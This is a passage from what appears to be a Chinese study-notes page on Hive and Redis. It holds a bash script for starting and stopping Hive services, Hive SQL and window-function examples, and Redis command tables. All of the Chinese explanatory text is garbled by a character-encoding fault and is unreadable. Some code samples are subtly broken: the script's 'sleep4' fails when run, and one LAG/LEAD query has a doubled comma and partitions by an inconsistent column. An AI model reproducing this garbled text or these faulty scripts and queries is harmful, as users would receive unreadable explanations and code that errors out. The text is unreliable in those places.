class="line"></span><br><span class="line">#æ£€æŸ¥è¿›ç¨‹æ˜¯å¦è¿è¡Œæ­£å¸¸ï¼Œå‚æ•°1ä¸ºè¿›ç¨‹åï¼Œå‚æ•°2ä¸ºè¿›ç¨‹ç«¯å£</span><br><span class="line">function check_process()</span><br><span class="line">&#123;</span><br><span class="line">    pid=$(ps -ef 2&gt;/dev/null | grep -v grep | grep -i $1 | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    ppid=$(netstat -nltp 2&gt;/dev/null | grep $2 | awk &#x27;&#123;print $7&#125;&#x27; | cut -d &#x27;/&#x27; -f 1)</span><br><span class="line">    echo $pid</span><br><span class="line">    [[ &quot;$pid&quot; =~ &quot;$ppid&quot; ]] &amp;&amp; [ &quot;$ppid&quot; ] &amp;&amp; return 0 || return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hive_start()</span><br><span class="line">&#123;</span><br><span class="line">    metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    cmd=&quot;nohup hive --service metastore &gt;$HIVE_LOG_DIR/metastore.log 2&gt;&amp;1 &amp;&quot;</span><br><span class="line">    cmd=$cmd&quot; sleep4; hdfs dfsadmin -safemode wait &gt;/dev/null 2&gt;&amp;1&quot;</span><br><span class="line">    [ -z &quot;$metapid&quot; ] &amp;&amp; eval $cmd || echo &quot;MetastroeæœåŠ¡å·²å¯åŠ¨&quot;</span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    cmd=&quot;nohup hive --service hiveserver2 &gt;$HIVE_LOG_DIR/hiveServer2.log 2&gt;&amp;1 &amp;&quot;</span><br><span class="line">    [ -z &quot;$server2pid&quot; ] &amp;&amp; eval $cmd || echo &quot;HiveServer2æœåŠ¡å·²å¯åŠ¨&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hive_stop()</span><br><span class="line">&#123;</span><br><span class="line">    metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    [ &quot;$metapid&quot; ] &amp;&amp; kill $metapid || echo &quot;MetastoreæœåŠ¡æœªå¯åŠ¨&quot;</span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    [ &quot;$server2pid&quot; ] &amp;&amp; kill $server2pid || echo &quot;HiveServer2æœåŠ¡æœªå¯åŠ¨&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">    hive_stop</span><br><span class="line">    ;;</span><br><span class="line">&quot;restart&quot;)</span><br><span class="line">    hive_stop</span><br><span class="line">    sleep 2</span><br><span class="line">    hive_start</span><br><span class="line">    ;;</span><br><span class="line">&quot;status&quot;)</span><br><span class="line">    check_process HiveMetastore 9083 &gt;/dev/null &amp;&amp; echo &quot;MetastoreæœåŠ¡è¿è¡Œæ­£å¸¸&quot; || echo &quot;MetastoreæœåŠ¡è¿è¡Œå¼‚å¸¸&quot;</span><br><span class="line">    check_process HiveServer2 10000 &gt;/dev/null &amp;&amp; echo &quot;HiveServer2æœåŠ¡è¿è¡Œæ­£å¸¸&quot; || echo &quot;HiveServer2æœåŠ¡è¿è¡Œå¼‚å¸¸&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo Invalid Args!</span><br><span class="line">    echo &#x27;Usage: &#x27;$(basename $0)&#x27; start|stop|restart|status&#x27;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨äº¤äº’å‘½ä»¤"><a href="#å¸¸ç”¨äº¤äº’å‘½ä»¤" class="headerlink" title="å¸¸ç”¨äº¤äº’å‘½ä»¤"></a>å¸¸ç”¨äº¤äº’å‘½ä»¤</h3><table><thead><tr><th>åŠŸèƒ½è¯´æ˜</th><th>å‘½ä»¤</th></tr></thead><tbody><tr><td>ä¸è¿›å…¥hiveçš„äº¤äº’çª—å£æ‰§è¡Œsql</td><td>bin/hive -e â€œsqlè¯­å¥â€</td></tr><tr><td>æ‰§è¡Œè„šæœ¬ä¸­sqlè¯­å¥</td><td>bin/hive -f hive.sql</td></tr><tr><td>é€€å‡ºhiveçª—å£</td><td>exit æˆ– quit</td></tr><tr><td>å‘½ä»¤çª—å£ä¸­æŸ¥çœ‹hdfsæ–‡ä»¶ç³»ç»Ÿ</td><td>dfs -ls /</td></tr><tr><td>å‘½ä»¤çª—å£ä¸­æŸ¥çœ‹hdfsæ–‡ä»¶ç³»ç»Ÿ</td><td>! ls /data/h</td></tr></tbody></table><h3 id="SQLç±»-ç‰¹æ®Šçš„"><a href="#SQLç±»-ç‰¹æ®Šçš„" class="headerlink" title="SQLç±»(ç‰¹æ®Šçš„)"></a>SQLç±»(ç‰¹æ®Šçš„)</h3><table><thead><tr><th>è¯´æ˜</th><th>è¯­å¥</th></tr></thead><tbody><tr><td>æŸ¥çœ‹hiveä¸­çš„æ‰€æœ‰æ•°æ®åº“</td><td>show databases</td></tr><tr><td>ç”¨defaultæ•°æ®åº“</td><td>use default</td></tr><tr><td>æŸ¥è¯¢è¡¨ç»“æ„</td><td>desc table_name</td></tr><tr><td>æŸ¥çœ‹æ•°æ®åº“</td><td>show databases</td></tr><tr><td>é‡å‘½åè¡¨å</td><td>alter table table1 rename to table2</td></tr><tr><td>ä¿®æ”¹è¡¨ä¸­å­—æ®µ</td><td>alter table table_name change name user_name String</td></tr><tr><td>ä¿®æ”¹å­—æ®µç±»å‹</td><td>alter table table_name change salary salary Double</td></tr><tr><td>åˆ›å»ºå¤–éƒ¨è¡¨</td><td>create external table â€¦.</td></tr><tr><td>æŸ¥è¯¢å¤–éƒ¨è¡¨ä¿¡æ¯</td><td>desc formatted outsidetable</td></tr><tr><td>åˆ›å»ºè§†å›¾</td><td>create view view_name as select * from table_name â€¦..</td></tr><tr><td>æ·»åŠ æ•°æ®</td><td>load data local inpath â€˜xxxâ€™ Â overwrite into table table_name partition(day=â€™2021-12-01â€™)</td></tr></tbody></table><h3 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h3><p>ï¼ˆ1ï¼‰ NVL</p><p>ç»™å€¼ä¸ºNULLçš„æ•°æ®èµ‹å€¼ï¼Œå®ƒçš„æ ¼å¼æ˜¯NVL( valueï¼Œdefault_value)ã€‚å®ƒçš„åŠŸèƒ½æ˜¯å¦‚æœvalueä¸ºNULLï¼Œåˆ™NVLå‡½æ•°è¿”å›default_valueçš„å€¼ï¼Œå¦åˆ™è¿”å›valueçš„å€¼ï¼Œå¦‚æœä¸¤ä¸ªå‚æ•°éƒ½ä¸ºNULL ï¼Œåˆ™è¿”å›NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select nvl(column, 0) from xxxï¼›</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è¡Œè½¬åˆ—</p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>CONCAT(string A/col, string B/colâ€¦)</td><td>è¿”å›è¾“å…¥å­—ç¬¦ä¸²è¿æ¥åçš„ç»“æœï¼Œæ”¯æŒä»»æ„ä¸ªè¾“å…¥å­—ç¬¦ä¸²</td></tr><tr><td>CONCAT_WS(separator, str1, str2,â€¦)</td><td>ç¬¬ä¸€ä¸ªå‚æ•°å‚æ•°é—´çš„åˆ†éš”ç¬¦ï¼Œå¦‚æœåˆ†éš”ç¬¦æ˜¯ NULLï¼Œè¿”å›å€¼ä¹Ÿå°†ä¸º NULLã€‚è¿™ä¸ªå‡½æ•°ä¼šè·³è¿‡åˆ†éš”ç¬¦å‚æ•°åçš„ä»»ä½• NULL å’Œç©ºå­—ç¬¦ä¸²ã€‚åˆ†éš”ç¬¦å°†è¢«åŠ åˆ°è¢«è¿æ¥çš„å­—ç¬¦ä¸²ä¹‹é—´ã€‚</td></tr><tr><td>COLLECT_SET(col)</td><td>å°†æŸå­—æ®µçš„å€¼è¿›è¡Œå»é‡æ±‡æ€»ï¼Œäº§ç”Ÿarrayç±»å‹å­—æ®µ</td></tr><tr><td>COLLECT_LIST(col)</td><td>å‡½æ•°åªæ¥å—åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å°†æŸå­—æ®µçš„å€¼è¿›è¡Œä¸å»é‡æ±‡æ€»ï¼Œäº§ç”Ÿarrayç±»å‹å­—æ®µã€‚</td></tr></tbody></table><p>ï¼ˆ3ï¼‰åˆ—è½¬è¡Œ(ä¸€åˆ—è½¬å¤šè¡Œ)</p><p><strong>Split(str, separator)ï¼š</strong> å°†å­—ç¬¦ä¸²æŒ‰ç…§åé¢çš„åˆ†éš”ç¬¦åˆ‡å‰²ï¼Œè½¬æ¢æˆå­—ç¬¦arrayã€‚</p><p><strong>EXPLODE(col)ï¼š</strong><br>å°†hiveä¸€åˆ—ä¸­å¤æ‚çš„arrayæˆ–è€…mapç»“æ„æ‹†åˆ†æˆå¤šè¡Œã€‚</p><p><strong>LATERAL VIEW</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æ³•ï¼š</span><br><span class="line"></span><br><span class="line">LATERAL VIEW udtf(expression) tableAlias AS columnAlias</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼šlateral viewç”¨äºå’Œsplit, explodeç­‰UDTFä¸€èµ·ä½¿ç”¨ï¼Œå®ƒèƒ½å¤Ÿå°†ä¸€è¡Œæ•°æ®æ‹†æˆå¤šè¡Œæ•°æ®ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šå¯ä»¥å¯¹æ‹†åˆ†åçš„æ•°æ®è¿›è¡Œèšåˆã€‚</p><p>lateral viewé¦–å…ˆä¸ºåŸå§‹è¡¨çš„æ¯è¡Œè°ƒç”¨UDTFï¼ŒUDTFä¼šæŠŠä¸€è¡Œæ‹†åˆ†æˆä¸€æˆ–è€…å¤šè¡Œï¼Œlateral viewå†æŠŠç»“æœç»„åˆï¼Œäº§ç”Ÿä¸€ä¸ªæ”¯æŒåˆ«åè¡¨çš„è™šæ‹Ÿè¡¨ã€‚</p><p><strong>å‡†å¤‡æ•°æ®æºæµ‹è¯•</strong></p><table><thead><tr><th>movie</th><th>category</th></tr></thead><tbody><tr><td>ã€ŠåŠŸå‹‹ã€‹</td><td>è®°å½•,å‰§æƒ…</td></tr><tr><td>ã€Šæˆ˜ç‹¼2ã€‹</td><td>æˆ˜äº‰,åŠ¨ä½œ,ç¾éš¾</td></tr></tbody></table><p><strong>SQL</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT movie,category_name </span><br><span class="line">FROM movie_info </span><br><span class="line">lateral VIEW</span><br><span class="line">explode(split(category,&quot;,&quot;)) movie_info_tmp  AS category_name ;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ç»“æœ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ã€ŠåŠŸå‹‹ã€‹      è®°å½•</span><br><span class="line">ã€ŠåŠŸå‹‹ã€‹      å‰§æƒ…</span><br><span class="line">ã€Šæˆ˜ç‹¼2ã€‹     æˆ˜äº‰</span><br><span class="line">ã€Šæˆ˜ç‹¼2ã€‹     åŠ¨ä½œ</span><br><span class="line">ã€Šæˆ˜ç‹¼2ã€‹     ç¾éš¾</span><br></pre></td></tr></table></figure><h3 id="çª—å£å‡½æ•°"><a href="#çª—å£å‡½æ•°" class="headerlink" title="çª—å£å‡½æ•°"></a>çª—å£å‡½æ•°</h3><p>ï¼ˆ1ï¼‰OVER()</p><p>å®šåˆ†æå‡½æ•°å·¥ä½œçš„æ•°æ®çª—å£å¤§å°ï¼Œè¿™ä¸ªæ•°æ®çª—å£å¤§å°å¯èƒ½ä¼šéšç€è¡Œçš„å˜è€Œå˜åŒ–ã€‚</p><p>ï¼ˆ2ï¼‰CURRENT ROWï¼ˆå½“å‰è¡Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n PRECEDINGï¼šå¾€å‰nè¡Œæ•°æ®</span><br><span class="line"></span><br><span class="line">n FOLLOWINGï¼šå¾€ånè¡Œæ•°æ®</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰UNBOUNDEDï¼ˆæ— è¾¹ç•Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNBOUNDED PRECEDING å‰æ— è¾¹ç•Œï¼Œè¡¨ç¤ºä»å‰é¢çš„èµ·ç‚¹</span><br><span class="line"></span><br><span class="line">UNBOUNDED FOLLOWINGåæ— è¾¹ç•Œï¼Œè¡¨ç¤ºåˆ°åé¢çš„ç»ˆç‚¹</span><br></pre></td></tr></table></figure><p><strong>SQLæ¡ˆä¾‹ï¼šç”±èµ·ç‚¹åˆ°å½“å‰è¡Œçš„èšåˆ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between UNBOUNDED PRECEDING and current row) </span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQLæ¡ˆä¾‹ï¼šå½“å‰è¡Œå’Œå‰é¢ä¸€è¡Œåšèšåˆ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between 1 PRECEDING and current row) </span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQLæ¡ˆä¾‹ï¼šå½“å‰è¡Œå’Œå‰é¢ä¸€è¡Œå’Œåä¸€è¡Œåšèšåˆ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between 1 PRECEDING AND 1 FOLLOWING )</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p><strong>SQLæ¡ˆä¾‹ï¼šå½“å‰è¡ŒåŠåé¢æ‰€æœ‰è¡Œ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">    sum(money) over(partition by user_id order by pay_time rows between current row and UNBOUNDED FOLLOWING  )</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰LAG(col,n,default_val)</p><p>å¾€å‰ç¬¬nè¡Œæ•°æ®ï¼Œæ²¡æœ‰çš„è¯default_val</p><p>ï¼ˆ5ï¼‰LEAD(col,n, default_val)</p><p>å¾€åç¬¬nè¡Œæ•°æ®ï¼Œæ²¡æœ‰çš„è¯default_val</p><p><strong>SQLæ¡ˆä¾‹ï¼šæŸ¥è¯¢ç”¨æˆ·è´­ä¹°æ˜ç»†ä»¥åŠä¸Šæ¬¡çš„è´­ä¹°æ—¶é—´å’Œä¸‹æ¬¡è´­ä¹°æ—¶é—´</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">user_id,,pay_time,money,</span><br><span class="line"></span><br><span class="line">lag(pay_time,1,&#x27;1970-01-01&#x27;) over(PARTITION by name order by pay_time) prev_time,</span><br><span class="line"></span><br><span class="line">lead(pay_time,1,&#x27;1970-01-01&#x27;) over(PARTITION by name order by pay_time) next_time</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>ï¼ˆ6ï¼‰FIRST_VALUE(col,true/false)</p><p>å½“å‰çª—å£ä¸‹çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueï¼Œè·³è¿‡ç©ºå€¼ã€‚</p><p>ï¼ˆ7ï¼‰LAST_VALUE (col,true/false)</p><p>å½“å‰çª—å£ä¸‹çš„æœ€åä¸€ä¸ªå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueï¼Œè·³è¿‡ç©ºå€¼ã€‚</p><p><strong>SQLæ¡ˆä¾‹ï¼šæŸ¥è¯¢ç”¨æˆ·æ¯ä¸ªæœˆç¬¬ä¸€æ¬¡çš„è´­ä¹°æ—¶é—´ å’Œ æ¯ä¸ªæœˆçš„æœ€åä¸€æ¬¡è´­ä¹°æ—¶é—´</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">FIRST_VALUE(pay_time) </span><br><span class="line">    over(</span><br><span class="line">        partition by user_id,month(pay_time) order by pay_time </span><br><span class="line">        rows between UNBOUNDED PRECEDING and UNBOUNDED FOLLOWING</span><br><span class="line">        ) first_time,</span><br><span class="line"></span><br><span class="line">LAST_VALUE(pay_time) </span><br><span class="line">    over(partition by user_id,month(pay_time) order by pay_time rows between UNBOUNDED PRECEDING and UNBOUNDED FOLLOWING</span><br><span class="line">    ) last_time</span><br><span class="line">from or_order;</span><br></pre></td></tr></table></figure><p>ï¼ˆ8ï¼‰NTILE(n)</p><p>æŠŠæœ‰åºçª—å£çš„è¡Œåˆ†å‘åˆ°æŒ‡å®šæ•°æ®çš„ç»„ä¸­ï¼Œå„ä¸ªç»„æœ‰ç¼–å·ï¼Œç¼–å·ä»1å¼€å§‹ï¼Œå¯¹äºæ¯ä¸€è¡Œï¼ŒNTILEè¿”å›æ­¤è¡Œæ‰€å±çš„ç»„çš„ç¼–å·ã€‚ï¼ˆç”¨äºå°†åˆ†ç»„æ•°æ®æŒ‰ç…§é¡ºåºåˆ‡åˆ†æˆnç‰‡ï¼Œè¿”å›å½“å‰åˆ‡ç‰‡å€¼ï¼‰</p><p><strong>SQLæ¡ˆä¾‹ï¼šæŸ¥è¯¢å‰25%æ—¶é—´çš„è®¢å•ä¿¡æ¯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from (</span><br><span class="line">    select User_id,pay_time,money,</span><br><span class="line">    </span><br><span class="line">    ntile(4) over(order by pay_time) sorted</span><br><span class="line">    </span><br><span class="line">    from or_order</span><br><span class="line">) t</span><br><span class="line">where sorted = 1;</span><br></pre></td></tr></table></figure><h3 id="4ä¸ªBy"><a href="#4ä¸ªBy" class="headerlink" title="4ä¸ªBy"></a>4ä¸ªBy</h3><p>ï¼ˆ1ï¼‰Order By</p><p>å…¨å±€æ’åºï¼Œåªæœ‰ä¸€ä¸ªReducerã€‚</p><p>ï¼ˆ2ï¼‰Sort By</p><p>åˆ†åŒºå†…æœ‰åºã€‚</p><p>ï¼ˆ3ï¼‰Distrbute By</p><p>ç±»ä¼¼MRä¸­Partitionï¼Œè¿›è¡Œåˆ†åŒºï¼Œç»“åˆsort byä½¿ç”¨ã€‚</p><p>ï¼ˆ4ï¼‰ Cluster By</p><p>å½“Distribute byå’ŒSorts byå­—æ®µç›¸åŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨Cluster byæ–¹å¼ã€‚Cluster byé™¤äº†å…·æœ‰Distribute byçš„åŠŸèƒ½å¤–è¿˜å…¼å…·Sort byçš„åŠŸèƒ½ã€‚ä½†æ˜¯æ’åºåªèƒ½æ˜¯å‡åºæ’åºï¼Œä¸èƒ½æŒ‡å®šæ’åºè§„åˆ™ä¸ºASCæˆ–è€…DESCã€‚</p><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­Order Byç”¨çš„æ¯”è¾ƒå°‘ï¼Œå®¹æ˜“å¯¼è‡´OOMã€‚</p><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­Sort By+ Distrbute Byç”¨çš„å¤šã€‚</p><h3 id="æ’åºå‡½æ•°"><a href="#æ’åºå‡½æ•°" class="headerlink" title="æ’åºå‡½æ•°"></a>æ’åºå‡½æ•°</h3><p>ï¼ˆ1ï¼‰RANK()</p><p>æ’åºç›¸åŒæ—¶ä¼šé‡å¤ï¼Œæ€»æ•°ä¸ä¼šå˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰DENSE_RANK()</p><p>æ’åºç›¸åŒæ—¶ä¼šé‡å¤ï¼Œæ€»æ•°ä¼šå‡å°‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ROW_NUMBER()</p><p>ä¼šæ ¹æ®é¡ºåºè®¡ç®—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="æ—¥æœŸå‡½æ•°"><a href="#æ—¥æœŸå‡½æ•°" class="headerlink" title="æ—¥æœŸå‡½æ•°"></a>æ—¥æœŸå‡½æ•°</h3><p>datediffï¼šè¿”å›ç»“æŸæ—¥æœŸå‡å»å¼€å§‹æ—¥æœŸçš„å¤©æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">datediff(string enddate, string startdate) </span><br><span class="line"></span><br><span class="line">select datediff(&#x27;2021-11-20&#x27;,&#x27;2021-11-22&#x27;)</span><br></pre></td></tr></table></figure><p>date_addï¼šè¿”å›å¼€å§‹æ—¥æœŸstartdateå¢åŠ dayså¤©åçš„æ—¥æœŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date_add(string startdate, int days) </span><br><span class="line"></span><br><span class="line">select date_add(&#x27;2021-11-20&#x27;,3)</span><br></pre></td></tr></table></figure><p>date_subï¼šè¿”å›å¼€å§‹æ—¥æœŸstartdateå‡å°‘dayså¤©åçš„æ—¥æœŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date_sub (string startdate, int days) </span><br><span class="line"></span><br><span class="line">select date_sub(&#x27;2021-11-22&#x27;,3)</span><br></pre></td></tr></table></figure><hr><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><h3 id="å¯åŠ¨ç±»-1"><a href="#å¯åŠ¨ç±»-1" class="headerlink" title="å¯åŠ¨ç±»"></a>å¯åŠ¨ç±»</h3><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>keys Â *</td><td>æŸ¥çœ‹å½“å‰åº“çš„æ‰€æœ‰é”®</td></tr><tr><td>exists</td><td>åˆ¤æ–­æŸä¸ªé”®æ˜¯å¦å­˜åœ¨</td></tr><tr><td>type</td><td>æŸ¥çœ‹é”®çš„ç±»å‹</td></tr><tr><td>del</td><td>åˆ é™¤æŸä¸ªé”®</td></tr><tr><td>expire</td><td>ä¸ºé”®å€¼è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå•ä½ç§’</td></tr><tr><td>ttl</td><td>æŸ¥çœ‹è¿˜æœ‰å¤šä¹…è¿‡æœŸ,-1è¡¨ç¤ºæ°¸ä¸è¿‡æœŸ,-2è¡¨ç¤ºå·²è¿‡æœŸ</td></tr><tr><td>dbsize</td><td>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­keyçš„æ•°é‡</td></tr><tr><td>flushdb</td><td>æ¸…ç©ºå½“å‰åº“</td></tr><tr><td>Flushall</td><td>é€šæ€å…¨éƒ¨åº“</td></tr></tbody></table><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>get</td><td>æŸ¥è¯¢å¯¹åº”é”®å€¼</td></tr><tr><td>set</td><td>æ·»åŠ é”®å€¼å¯¹</td></tr><tr><td>append</td><td>å°†ç»™å®šçš„è¿½åŠ åˆ°åŸå€¼çš„æœ«å°¾</td></tr><tr><td>strlen</td><td>è·å–å€¼çš„é•¿åº¦</td></tr><tr><td>setnx</td><td>åªæœ‰åœ¨key ä¸å­˜åœ¨æ—¶è®¾ç½®keyçš„å€¼</td></tr><tr><td>incr</td><td>å°†keyä¸­å­˜å‚¨çš„æ•°å­—å€¼å¢1åªèƒ½å¯¹æ•°å­—å€¼æ“ä½œï¼Œå¦‚æœä¸ºç©ºï¼Œæ–°å¢å€¼ä¸º1</td></tr><tr><td>decr</td><td>å°†keyä¸­å­˜å‚¨çš„æ•°å­—å€¼å‡1åªèƒ½å¯¹æ•°å­—ä¹‹æ“ä½œï¼Œå¦‚æœä¸ºç©º,æ–°å¢å€¼ä¸º-1</td></tr><tr><td>incrby /decrby Â æ­¥é•¿</td><td>å°†keyä¸­å­˜å‚¨çš„æ•°å­—å€¼å¢å‡ï¼Œè‡ªå®šä¹‰æ­¥é•¿</td></tr><tr><td>mset</td><td>åŒæ—¶è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªkey-valueå¯¹</td></tr><tr><td>mget</td><td>åŒæ—¶è·å–ä¸€ä¸ªæˆ–å¤šä¸ªvalue</td></tr><tr><td>msetnx</td><td>åŒæ—¶è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªkey-valueå¯¹ï¼Œå½“ä¸”ä»…å½“æ‰€æœ‰ç»™å®šçš„keyéƒ½ä¸å­˜åœ¨</td></tr><tr><td>getrange Â &lt;èµ·å§‹ä½ç½®&gt; &lt;ç»“æŸä½ç½®&gt;</td><td>è·å¾—å€¼çš„èŒƒå›´,ç±»ä¼¼javaä¸­çš„substring</td></tr><tr><td>setrange Â &lt;èµ·å§‹ä½ç½®&gt;</td><td>ç”¨è¦†ç›–æ‰€å­˜å‚¨çš„å­—ç¬¦ä¸²å€¼ï¼Œä»&lt;èµ·å§‹ä½ç½®&gt;å¼€å§‹</td></tr><tr><td>setex Â &lt;è¿‡æœŸæ—¶é—´&gt;</td><td>è®¾ç½®é”®å€¼çš„åŒæ—¶ï¼Œè®¾ç½®è¿‡å»æ—¶é—´ï¼Œå•ä½ç§’</td></tr><tr><td>getset</td><td>ä»¥æ–°æ¢æ—§,è®¾ç½®äº†æ–°å€¼çš„åŒæ—¶è·å–æ—§å€¼</td></tr></tbody></table><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td>lpush/rpush</td><td>ä»å·¦è¾¹/å³è¾¹æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå€¼ã€‚</td></tr><tr><td>lpop/rpop</td><td>ä»å·¦è¾¹/å³è¾¹åå‡ºä¸€ä¸ªå€¼ã€‚å€¼åœ¨é”®åœ¨ï¼Œå€¼å…‰é”®äº¡ã€‚</td></tr><tr><td>rpoplpush</td><td>ä»åˆ—è¡¨å³è¾¹åå‡ºä¸€ä¸ªå€¼ï¼Œæ’åˆ°åˆ—è¡¨å·¦è¾¹</td></tr><tr><td>lrange</td><td>æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ (ä»å·¦åˆ°å³)</td></tr><tr><td>lindex</td><td>æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ 